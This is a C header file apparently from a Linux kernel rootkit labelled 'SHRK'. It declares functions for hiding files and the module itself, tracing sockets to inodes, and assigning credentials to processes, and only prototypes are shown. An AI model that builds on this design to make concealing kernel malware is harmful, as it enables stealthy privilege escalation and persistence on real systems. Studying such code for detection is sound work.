#pragma once
#include <net/sock.h>

#if SHRK_DEBUG == 1
#define debg(...) print_debug(__func__, __VA_ARGS__)
#else
#define debg(...) asm("nop")
#endif

void     print_debug(const char *caller, char *msg, ...);
char    *path_join(char *p1, char *p2);
char    *path_from_fd(int32_t fd, char path[PATH_MAX + 1]);
uint64_t inode_from_sock(struct sock *sk);
int      commit_creds_to(struct task_struct *task, struct cred *new);
bool     should_hide_path(struct path *p);
void     hideself(void);
void     showself(void);
